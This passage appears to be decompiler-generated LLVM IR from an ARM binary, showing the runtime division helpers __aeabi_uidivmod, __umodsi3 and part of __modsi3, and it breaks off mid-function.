  uselistorder i32 256, { 0, 1, 2, 5, 6, 7, 3, 4, 8, 11, 12, 13, 9, 10, 14, 15, 16, 17, 18, 418, 419, 19, 20, 21, 22, 23, 24, 25, 421, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 38, 43, 42, 41, 44, 417, 422, 49, 45, 48, 46, 47, 420, 51, 50, 52, 53, 54, 57, 56, 55, 58, 60, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 72, 71, 73, 74, 75, 79, 85, 80, 76, 81, 86, 82, 87, 83, 77, 88, 78, 89, 90, 84, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 102, 103, 101, 104, 107, 108, 106, 105, 109, 112, 111, 110, 119, 116, 120, 117, 113, 121, 118, 114, 115, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 140, 139, 141, 142, 143, 154, 149, 144, 155, 150, 151, 156, 152, 145, 146, 147, 157, 158, 159, 160, 153, 148, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 173, 172, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 186, 185, 194, 190, 195, 191, 187, 188, 192, 189, 196, 197, 193, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 214, 213, 212, 220, 215, 226, 227, 221, 216, 228, 229, 222, 217, 230, 223, 224, 231, 225, 232, 218, 233, 219, 234, 235, 236, 237, 238, 239, 240, 243, 244, 247, 245, 241, 248, 246, 242, 251, 250, 249, 254, 255, 252, 256, 253, 257, 262, 260, 263, 261, 258, 259, 264, 415, 423, 265, 266, 267, 268, 272, 269, 270, 271, 274, 275, 273, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 291, 292, 295, 293, 289, 296, 294, 290, 299, 298, 297, 302, 303, 300, 304, 301, 305, 310, 308, 311, 309, 306, 307, 312, 416, 424, 313, 314, 315, 316, 320, 317, 318, 319, 322, 323, 321, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 342, 341, 343, 344, 345, 346, 348, 347, 349, 350, 352, 351, 353, 354, 355, 356, 359, 366, 360, 361, 357, 362, 363, 364, 358, 367, 365, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 381, 380, 382, 383, 384, 388, 395, 389, 390, 396, 391, 385, 386, 392, 387, 393, 397, 394, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 411, 410, 412, 413, 414 }
  uselistorder i32 128, { 5, 6, 7, 12, 0, 13, 8, 9, 10, 11, 14, 1, 15, 2, 3, 4, 16, 17, 18 }
  uselistorder i32 255, { 5, 6, 2, 7, 3, 8, 4, 9, 0, 1 }
  uselistorder i32 65536, { 9, 10, 11, 12, 13, 14, 1, 16, 15, 17, 2, 18, 0, 3, 19, 20, 21, 22, 23, 26, 24, 25, 27, 28, 29, 34, 35, 36, 37, 30, 31, 32, 33, 38, 41, 42, 43, 39, 40, 44, 45, 46, 47, 48, 49, 51, 50, 52, 4, 53, 55, 56, 54, 57, 58, 5, 62, 63, 59, 60, 64, 61, 65, 66, 67, 68, 69, 106, 71, 70, 107, 72, 73, 75, 74, 77, 76, 108, 79, 78, 109, 80, 81, 83, 82, 85, 84, 6, 86, 88, 89, 87, 90, 91, 7, 92, 95, 96, 97, 93, 94, 98, 8, 99, 103, 104, 105, 100, 101, 102 }
  uselistorder i32 32768, { 1, 0 }
  uselistorder i32 65535, { 100, 0, 1, 12, 53, 27, 54, 26, 55, 25, 56, 13, 14, 2, 29, 57, 28, 58, 59, 15, 60, 3, 30, 61, 31, 62, 32, 63, 64, 4, 33, 65, 66, 16, 67, 24, 37, 68, 34, 69, 35, 70, 36, 71, 72, 17, 73, 5, 74, 75, 41, 76, 40, 77, 38, 78, 39, 79, 18, 19, 6, 80, 42, 81, 43, 82, 20, 21, 7, 83, 44, 84, 45, 85, 86, 8, 46, 87, 88, 89, 22, 90, 91, 9, 49, 92, 47, 93, 48, 94, 95, 23, 96, 10, 11, 52, 97, 50, 98, 51, 99 }
  uselistorder i32 %arg2, { 7, 12, 6, 5, 4, 10, 11, 8, 9, 0, 3, 1, 2 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_11ff0, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_11fac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f98thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_12054 = udiv i32 %arg1, %arg2
  ret i32 %v2_12054
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_12068 = add i32 %arg2, -1
  %v2_12068 = icmp eq i32 %arg2, 0
  br i1 %v2_12068, label %dec_label_pc_12124, label %dec_label_pc_12070

dec_label_pc_12070:                               ; preds = %entry
  %v7_12068 = icmp eq i32 %arg2, 1
  br i1 %v7_12068, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_12070
  %v1_12070 = load i32, i32* @r0, align 4
  %v10_12070 = icmp eq i32 %v1_12070, %arg2
  br i1 %v10_12070, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_12070, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_12070 = icmp ult i32 %v1_12070, %arg2
  br i1 %v4_12070, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_12078 = and i32 %v1_12068, %arg2
  %v8_12078 = icmp eq i32 %v6_12078, 0
  br i1 %v8_12078, label %.thread67, label %dec_label_pc_12088.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_1207c = phi i32 [ %v1_12070, %bb75 ], [ 0, %.thread65 ]
  %v3_1207c = and i32 %v1_1207c, %v1_12068
  br label %bb76

dec_label_pc_12088.preheader:                     ; preds = %bb75
  %v2_1208897 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_1208897, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_12118, %bb74, %bb89, %bb84, %dec_label_pc_120e8, %.thread67
  %v5_12080 = phi i32 [ %v1_12070, %bb74 ], [ %v3_1207c, %.thread67 ], [ %v1_120c4.v6_120c4.v6_120cc.v6_120d4, %dec_label_pc_120e8 ], [ 0, %bb84 ], [ %v1_1211c, %dec_label_pc_12118 ], [ %v2_12118, %bb89 ]
  ret i32 %v5_12080

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_12088.preheader
  %v0_1209c.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_12088.preheader ], [ %v4_12090, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_12088.preheader ], [ %v2_1209411, %.thread1.thread9 ]
  br label %dec_label_pc_1209cthread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_12088.preheader, %.thread1.thread9
  %storemerge99 = phi i32 [ %v2_1209411, %.thread1.thread9 ], [ 0, %dec_label_pc_12088.preheader ]
  %v0_1209c.pr3398 = phi i32 [ %v4_12090, %.thread1.thread9 ], [ %arg2, %dec_label_pc_12088.preheader ]
  %v4_1208c = icmp ult i32 %v0_1209c.pr3398, %v1_12070
  br i1 %v4_1208c, label %bb78, label %dec_label_pc_1209cthread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_12090 = and i32 %v0_1209c.pr3398, 268435456
  %v3_12090 = icmp eq i32 %v2_12090, 0
  %v4_12090 = mul i32 %v0_1209c.pr3398, 16
  br i1 %v3_12090, label %.thread1.thread9, label %dec_label_pc_1209c.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_1209411 = add i32 %storemerge99, 4
  %v2_12088 = icmp ugt i32 %v4_12090, 268435455
  br i1 %v2_12088, label %.thread, label %bb77

dec_label_pc_1209cthread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_1209cthread-pre-split.loopexit

dec_label_pc_1209cthread-pre-split.loopexit:      ; preds = %dec_label_pc_1209cthread-pre-split.loopexit.loopexit, %.thread
  %v0_1209c.pr3396 = phi i32 [ %v0_1209c.pr33.lcssa, %.thread ], [ %v0_1209c.pr3398, %dec_label_pc_1209cthread-pre-split.loopexit.loopexit ]
  %storemerge93 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge99, %dec_label_pc_1209cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1209cthread-pre-split

dec_label_pc_1209cthread-pre-split:               ; preds = %.thread4, %dec_label_pc_1209cthread-pre-split.loopexit
  %v1_120a839 = phi i32 [ %storemerge93, %dec_label_pc_1209cthread-pre-split.loopexit ], [ %v2_120a8, %.thread4 ]
  %v0_1209c.pr = phi i32 [ %v0_1209c.pr3396, %dec_label_pc_1209cthread-pre-split.loopexit ], [ %v3_120a4, %.thread4 ]
  br label %dec_label_pc_1209c

dec_label_pc_1209c.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_1209c

dec_label_pc_1209c:                               ; preds = %dec_label_pc_1209c.loopexit, %dec_label_pc_1209cthread-pre-split
  %v0_120b0.pr = phi i32 [ %v1_120a839, %dec_label_pc_1209cthread-pre-split ], [ %storemerge99, %dec_label_pc_1209c.loopexit ]
  %v1_120a4 = phi i32 [ %v0_1209c.pr, %dec_label_pc_1209cthread-pre-split ], [ %v4_12090, %dec_label_pc_1209c.loopexit ]
  %v2_1209c = icmp slt i32 %v1_120a4, 0
  br i1 %v2_1209c, label %dec_label_pc_120b0, label %bb79

bb79:                                             ; preds = %dec_label_pc_1209c
  %v4_120a0 = icmp ult i32 %v1_120a4, %v1_12070
  br i1 %v4_120a0, label %.thread4, label %dec_label_pc_120b0

.thread4:                                         ; preds = %bb79
  %v3_120a4 = mul i32 %v1_120a4, 2
  %v2_120a8 = add i32 %v0_120b0.pr, 1
  br label %dec_label_pc_1209cthread-pre-split

dec_label_pc_120b0:                               ; preds = %bb79, %dec_label_pc_1209c
  %v2_120b0 = add i32 %v0_120b0.pr, -3
  %v5_120b4 = icmp slt i32 %v0_120b0.pr, 3
  br i1 %v5_120b4, label %dec_label_pc_120f4, label %dec_label_pc_120b8

dec_label_pc_120b8:                               ; preds = %dec_label_pc_120b0, %bb83
  %v6_120e0 = phi i32 [ %v0_120e8, %bb83 ], [ %v2_120b0, %dec_label_pc_120b0 ]
  %v1_120bc = phi i32 [ %v1_120c4.v6_120c4.v6_120cc.v6_120d4, %bb83 ], [ %v1_12070, %dec_label_pc_120b0 ]
  %v3_120dc12 = phi i32 [ %v3_120dc, %bb83 ], [ %v1_120a4, %dec_label_pc_120b0 ]
  %v3_120b8 = icmp ult i32 %v1_120bc, %v3_120dc12
  %v3_120bc = select i1 %v3_120b8, i32 0, i32 %v3_120dc12
  %v1_120c4 = sub i32 %v1_120bc, %v3_120bc
  %v4_120c0 = udiv i32 %v3_120dc12, 2
  %v6_120c0 = icmp ult i32 %v1_120c4, %v4_120c0
  %v6_120c4 = select i1 %v6_120c0, i32 0, i32 %v4_120c0
  %v1_120c4.v6_120c4 = sub i32 %v1_120c4, %v6_120c4
  %.demorgan = and i1 %v3_120b8, %v6_120c0
  %v4_120c8 = udiv i32 %v3_120dc12, 4
  %v6_120c8 = icmp ult i32 %v1_120c4.v6_120c4, %v4_120c8
  %v6_120cc = select i1 %v6_120c8, i32 0, i32 %v4_120c8
  %v1_120c4.v6_120c4.v6_120cc = sub i32 %v1_120c4.v6_120c4, %v6_120cc
  %.demorgan71 = and i1 %.demorgan, %v6_120c8
  %v4_120d0 = udiv i32 %v3_120dc12, 8
  %v6_120d0 = icmp ult i32 %v1_120c4.v6_120c4.v6_120cc, %v4_120d0
  %v6_120d4 = select i1 %v6_120d0, i32 0, i32 %v4_120d0
  %v1_120c4.v6_120c4.v6_120cc.v6_120d4 = sub i32 %v1_120c4.v6_120c4.v6_120cc, %v6_120d4
  %.demorgan72 = and i1 %.demorgan71, %v6_120d0
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_120b8
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_120b8, %bb80
  %v2_120d8 = add i32 %v1_120c4.v6_120c4.v6_120cc.v6_120d4, -1
  %v4_120d8 = sub i32 0, %v1_120c4.v6_120c4.v6_120cc.v6_120d4
  %v5_120d8 = and i32 %v1_120c4.v6_120c4.v6_120cc.v6_120d4, %v4_120d8
  %v3_120dc = udiv i32 %v3_120dc12, 16
  %v5_120e0 = icmp slt i32 %v1_120c4.v6_120c4.v6_120cc.v6_120d4, 1
  br i1 %v5_120e0, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_120e0 = add i32 %v6_120e0, -4
  %v9_120e0 = sub i32 3, %v6_120e0
  %v10_120e0 = and i32 %v9_120e0, %v6_120e0
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_120e8 = phi i32 [ %v6_120e0, %bb81 ], [ %v7_120e0, %bb82 ]
  %v0_120e415.in = phi i32 [ %v2_120d8, %bb81 ], [ %v7_120e0, %bb82 ]
  %v1_120e414.in = phi i32 [ %v5_120d8, %bb81 ], [ %v10_120e0, %bb82 ]
  %v1_120e414 = icmp slt i32 %v1_120e414.in, 0
  %v0_120e415 = icmp slt i32 %v0_120e415.in, 0
  %v2_120e4 = xor i1 %v0_120e415, %v1_120e414
  br i1 %v2_120e4, label %dec_label_pc_120e8, label %dec_label_pc_120b8

dec_label_pc_120e8:                               ; preds = %bb83
  %v1_120e8 = urem i32 %v0_120e8, 4
  %v2_120e8 = icmp eq i32 %v1_120e8, 0
  br i1 %v2_120e8, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_120e8
  %v3_120ec = icmp eq i32 %v1_120c4.v6_120c4.v6_120cc.v6_120d4, 0
  br i1 %v3_120ec, label %bb76, label %dec_label_pc_120f4

dec_label_pc_120f4:                               ; preds = %bb84, %dec_label_pc_120b0
  %v0_12108 = phi i32 [ %v3_120dc, %bb84 ], [ %v1_120a4, %dec_label_pc_120b0 ]
  %v1_12104 = phi i32 [ %v1_120c4.v6_120c4.v6_120cc.v6_120d4, %bb84 ], [ %v1_12070, %dec_label_pc_120b0 ]
  %v0_120f4 = phi i32 [ %v0_120e8, %bb84 ], [ %v2_120b0, %dec_label_pc_120b0 ]
  %v5_120f8 = icmp slt i32 %v0_120f4, -2
  br i1 %v5_120f8, label %dec_label_pc_12118, label %dec_label_pc_120fc

dec_label_pc_120fc:                               ; preds = %dec_label_pc_120f4
  %v8_120f4 = icmp eq i32 %v0_120f4, -2
  br i1 %v8_120f4, label %dec_label_pc_1210c, label %dec_label_pc_12100

dec_label_pc_12100:                               ; preds = %dec_label_pc_120fc
  %v3_12100 = icmp ult i32 %v1_12104, %v0_12108
  br i1 %v3_12100, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_12100
  %v2_12100 = sub i32 %v1_12104, %v0_12108
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_12100, %bb85
  %v0_1210c52 = phi i32 [ %v1_12104, %dec_label_pc_12100 ], [ %v2_12100, %bb85 ]
  %v3_12108 = udiv i32 %v0_12108, 2
  br label %dec_label_pc_1210c

dec_label_pc_1210c:                               ; preds = %dec_label_pc_120fc, %bb86
  %v0_12114 = phi i32 [ %v0_12108, %dec_label_pc_120fc ], [ %v3_12108, %bb86 ]
  %v1_12110 = phi i32 [ %v1_12104, %dec_label_pc_120fc ], [ %v0_1210c52, %bb86 ]
  %v3_1210c = icmp ult i32 %v1_12110, %v0_12114
  br i1 %v3_1210c, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_1210c
  %v2_1210c = sub i32 %v1_12110, %v0_12114
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_1210c, %bb87
  %v0_1211855 = phi i32 [ %v1_12110, %dec_label_pc_1210c ], [ %v2_1210c, %bb87 ]
  %v3_12114 = udiv i32 %v0_12114, 2
  br label %dec_label_pc_12118

dec_label_pc_12118:                               ; preds = %dec_label_pc_120f4, %bb88
  %v2_1211c = phi i32 [ %v0_12108, %dec_label_pc_120f4 ], [ %v3_12114, %bb88 ]
  %v1_1211c = phi i32 [ %v1_12104, %dec_label_pc_120f4 ], [ %v0_1211855, %bb88 ]
  %v3_12118 = icmp ult i32 %v1_1211c, %v2_1211c
  br i1 %v3_12118, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_12118
  %v2_12118 = sub i32 %v1_1211c, %v2_1211c
  br label %bb76

dec_label_pc_12124:                               ; preds = %entry
  %v0_12124 = load i32, i32* @lr, align 4
  %v0_12128 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_12124)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1211c, { 1, 2, 0 }
  uselistorder i32 %v0_12108, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_120e8, { 1, 0, 2 }
  uselistorder i32 %v7_120e0, { 1, 0 }
  uselistorder i32 %v3_120dc, { 1, 0 }
  uselistorder i32 %v1_120c4.v6_120c4.v6_120cc.v6_120d4, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_120d0, { 1, 0 }
  uselistorder i32 %v4_120c8, { 1, 0 }
  uselistorder i32 %v4_120c0, { 1, 0 }
  uselistorder i32 %v6_120e0, { 3, 0, 2, 1 }
  uselistorder i32 %v2_120b0, { 1, 0 }
  uselistorder i32 %v1_120a4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_12090, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1209c.pr3398, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12070, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_12118, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_1210c, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_120b8, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_12134 = icmp eq i32 %arg2, 0
  br i1 %v2_12134, label %dec_label_pc_12208, label %dec_label_pc_1213c

dec_label_pc_1213c:                               ; preds = %entry
  %v1_12134 = icmp slt i32 %arg2, 0
  br i1 %v1_12134, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_1213c
  %v2_1213c = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_1213c, %bb
  %v4_12154 = phi i32 [ %arg2, %dec_label_pc_1213c ], [ %v2_1213c, %bb ]
  %v0_12140 = load i32, i32* @r0, align 4
  %v1_12140 = icmp slt i32 %v0_12140, 0
  br i1 %v1_12140, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_12144 = sub i32 0, %v0_12140
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_1214c = phi i32 [ %v0_12140, %bb79 ], [ %v2_12144, %bb80 ]
  %v1_12148 = add i32 %v4_12154, -1
  %v7_12148 = icmp eq i32 %v4_12154, 1
  br i1 %v7_12148, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_1214c = icmp eq i32 %v1_1214c, %v4_12154
  br i1 %v10_1214c, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_1214c = icmp ult i32 %v1_1214c, %v4_12154
  br i1 %v4_1214c, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_12154 = and i32 %v1_12148, %v4_12154
  %v8_12154 = icmp eq i32 %v6_12154, 0
  br i1 %v8_12154, label %.thread72, label %dec_label_pc_12164.preheader

dec_label_pc_12164.preheader:                     ; preds = %bb84
  %v2_12164107 = icmp ugt i32 %v4_12154, 268435455
  br i1 %v2_12164107, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_1215864 = phi i32 [ %v1_1214c, %bb84 ], [ 0, %.thread70 ]
  %v3_12158 = and i32 %v1_1215864, %v1_12148
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_12164.preheader
  %v0_12178.pr35.lcssa = phi i32 [ %v4_12154, %dec_label_pc_12164.preheader ], [ %v4_1216c, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_12164.preheader ], [ %v2_121709, %.thread2.thread7 ]
  br label %dec_label_pc_12178thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_12164.preheader, %.thread2.thread7
  %storemerge109 = phi i32 [ %v2_121709, %.thread2.thread7 ], [ 0, %dec_label_pc_12164.preheader ]
  %v0_12178.pr35108 = phi i32 [ %v4_1216c, %.thread2.thread7 ], [ %v4_12154, %dec_label_pc_12164.preheader ]
  %v4_12168 = icmp ult i32 %v0_12178.pr35108, %v1_1214c
  br i1 %v4_12168, label %bb86, label %dec_label_pc_12178thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_1216c = and i32 %v0_12178.pr35108, 268435456
  %v3_1216c = icmp eq i32 %v2_1216c, 0
  %v4_1216c = mul i32 %v0_12178.pr35108, 16
  br i1 %v3_1216c, label %.thread2.thread7, label %dec_label_pc_12178.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_121709 = add i32 %storemerge109, 4
  %v2_12164 = icmp ugt i32 %v4_1216c, 268435455
  br i1 %v2_12164, label %.thread1, label %bb85

dec_label_pc_12178thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_12178thread-pre-split.loopexit

dec_label_pc_12178thread-pre-split.loopexit:      ; preds = %dec_label_pc_12178thread-pre-split.loopexit.loopexit, %.thread1
  %v0_12178.pr35106 = phi i32 [ %v0_12178.pr35.lcssa, %.thread1 ], [ %v0_12178.pr35108, %dec_label_pc_12178thread-pre-split.loopexit.loopexit ]
  %storemerge103 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge109, %dec_label_pc_12178thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12178thread-pre-split

dec_label_pc_12178thread-pre-split:               ; preds = %.thread4, %dec_label_pc_12178thread-pre-split.loopexit
  %v1_1218441 = phi i32 [ %storemerge103, %dec_label_pc_12178thread-pre-split.loopexit ], [ %v2_12184, %.thread4 ]
  %v2_1217c36 = phi i32 [ %v1_1214c, %dec_label_pc_12178thread-pre-split.loopexit ], [ %v2_1217c, %.thread4 ]
  %v0_12178.pr = phi i32 [ %v0_12178.pr35106, %dec_label_pc_12178thread-pre-split.loopexit ], [ %v3_12180, %.thread4 ]
  br label %dec_label_pc_12178

dec_label_pc_12178.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_12178

dec_label_pc_12178:                               ; preds = %dec_label_pc_12178.loopexit, %dec_label_pc_12178thread-pre-split
  %v0_1218c.pr = phi i32 [ %v1_1218441, %dec_label_pc_12178thread-pre-split ], [ %storemerge109, %dec_label_pc_12178.loopexit ]
  %v2_1217c = phi i32 [ %v2_1217c36, %dec_label_pc_12178thread-pre-split ], [ %v1_1214c, %dec_label_pc_12178.loopexit ]
  %v1_12180 = phi i32 [ %v0_12178.pr, %dec_label_pc_12178thread-pre-split ], [ %v4_1216c, %dec_label_pc_12178.loopexit ]
  %v2_12178 = icmp slt i32 %v1_12180, 0
  br i1 %v2_12178, label %dec_label_pc_1218c, label %bb87

bb87:                                             ; preds = %dec_label_pc_12178
  %v4_1217c = icmp ult i32 %v1_12180, %v2_1217c
  br i1 %v4_1217c, label %.thread4, label %dec_label_pc_1218c

.thread4:                                         ; preds = %bb87
  %v3_12180 = mul i32 %v1_12180, 2
  %v2_12184 = add i32 %v0_1218c.pr, 1
  br label %dec_label_pc_12178thread-pre-split

dec_label_pc_1218c:                               ; preds = %bb87, %dec_label_pc_12178
  %v2_1218c = add i32 %v0_1218c.pr, -3
  %v5_12190 = icmp slt i32 %v0_1218c.pr, 3
  br i1 %v5_12190, label %dec_label_pc_121d0, label %dec_label_pc_12194

dec_label_pc_12194:                               ; preds = %dec_label_pc_1218c, %bb91
  %v6_121bc = phi i32 [ %v0_121c4, %bb91 ], [ %v2_1218c, %dec_label_pc_1218c ]
  %v1_12198 = phi i32 [ %v1_121a0.v6_121a0.v6_121a8.v6_121b0, %bb91 ], [ %v2_1217c, %dec_label_pc_1218c ]
  %v3_121b810 = phi i32 [ %v3_121b8, %bb91 ], [ %v1_12180, %dec_label_pc_1218c ]
  %v3_12194 = icmp ult i32 %v1_12198, %v3_121b810
  %v3_12198 = select i1 %v3_12194, i32 0, i32 %v3_121b810
  %v1_121a0 = sub i32 %v1_12198, %v3_12198
  %v4_1219c = udiv i32 %v3_121b810, 2
  %v6_1219c = icmp ult i32 %v1_121a0, %v4_1219c
  %v6_121a0 = select i1 %v6_1219c, i32 0, i32 %v4_1219c
  %v1_121a0.v6_121a0 = sub i32 %v1_121a0, %v6_121a0
  %.demorgan = and i1 %v3_12194, %v6_1219c
  %v4_121a4 = udiv i32 %v3_121b810, 4
  %v6_121a4 = icmp ult i32 %v1_121a0.v6_121a0, %v4_121a4
  %v6_121a8 = select i1 %v6_121a4, i32 0, i32 %v4_121a4
  %v1_121a0.v6_121a0.v6_121a8 = sub i32 %v1_121a0.v6_121a0, %v6_121a8
  %.demorgan76 = and i1 %.demorgan, %v6_121a4
  %v4_121ac = udiv i32 %v3_121b810, 8
  %v6_121ac = icmp ult i32 %v1_121a0.v6_121a0.v6_121a8, %v4_121ac
  %v6_121b0 = select i1 %v6_121ac, i32 0, i32 %v4_121ac
  %v1_121a0.v6_121a0.v6_121a8.v6_121b0 = sub i32 %v1_121a0.v6_121a0.v6_121a8, %v6_121b0
  %.demorgan77 = and i1 %.demorgan76, %v6_121ac
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_12194
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_12194, %bb88
  %v2_121b4 = add i32 %v1_121a0.v6_121a0.v6_121a8.v6_121b0, -1
  %v4_121b4 = sub i32 0, %v1_121a0.v6_121a0.v6_121a8.v6_121b0
  %v5_121b4 = and i32 %v1_121a0.v6_121a0.v6_121a8.v6_121b0, %v4_121b4
  %v3_121b8 = udiv i32 %v3_121b810, 16
  %v5_121bc = icmp slt i32 %v1_121a0.v6_121a0.v6_121a8.v6_121b0, 1
  br i1 %v5_121bc, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_121bc = add i32 %v6_121bc, -4
  %v9_121bc = sub i32 3, %v6_121bc
  %v10_121bc = and i32 %v9_121bc, %v6_121bc
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_121c4 = phi i32 [ %v6_121bc, %bb89 ], [ %v7_121bc, %bb90 ]
  %v0_121c013.in = phi i32 [ %v2_121b4, %bb89 ], [ %v7_121bc, %bb90 ]
  %v1_121c012.in = phi i32 [ %v5_121b4, %bb89 ], [ %v10_121bc, %bb90 ]
  %v1_121c012 = icmp slt i32 %v1_121c012.in, 0
  %v0_121c013 = icmp slt i32 %v0_121c013.in, 0
  %v2_121c0 = xor i1 %v0_121c013, %v1_121c012
  br i1 %v2_121c0, label %dec_label_pc_121c4, label %dec_label_pc_12194

dec_label_pc_121c4:                               ; preds = %bb91
  %v1_121c4 = urem i32 %v0_121c4, 4
  %v2_121c4 = icmp eq i32 %v1_121c4, 0
  br i1 %v2_121c4, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_121c4
  %v3_121c8 = icmp eq i32 %v1_121a0.v6_121a0.v6_121a8.v6_121b0, 0
  br i1 %v3_121c8, label %.thread6, label %dec_label_pc_121d0

dec_label_pc_121d0:                               ; preds = %bb92, %dec_label_pc_1218c
  %v0_121e4 = phi i32 [ %v3_121b8, %bb92 ], [ %v1_12180, %dec_label_pc_1218c ]
  %v1_121e0 = phi i32 [ %v1_121a0.v6_121a0.v6_121a8.v6_121b0, %bb92 ], [ %v2_1217c, %dec_label_pc_1218c ]
  %v0_121d0 = phi i32 [ %v0_121c4, %bb92 ], [ %v2_1218c, %dec_label_pc_1218c ]
  %v5_121d4 = icmp slt i32 %v0_121d0, -2
  br i1 %v5_121d4, label %dec_label_pc_121f4, label %dec_label_pc_121d8

dec_label_pc_121d8:                               ; preds = %dec_label_pc_121d0
  %v8_121d0 = icmp eq i32 %v0_121d0, -2
  br i1 %v8_121d0, label %dec_label_pc_121e8, label %dec_label_pc_121dc

dec_label_pc_121dc:                               ; preds = %dec_label_pc_121d8
  %v3_121dc = icmp ult i32 %v1_121e0, %v0_121e4
  br i1 %v3_121dc, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_121dc
  %v2_121dc = sub i32 %v1_121e0, %v0_121e4
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_121dc, %bb93
